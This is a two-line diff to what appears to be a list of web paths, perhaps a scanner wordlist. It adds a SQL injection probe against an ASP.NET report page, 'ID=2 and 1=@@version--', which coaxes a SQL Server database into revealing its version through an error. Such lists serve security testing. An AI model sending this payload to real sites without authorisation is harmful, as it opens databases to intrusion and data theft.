@@ -1,1 +1,2 @@
 /data/sys-common/treexml.tmpl
+/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+
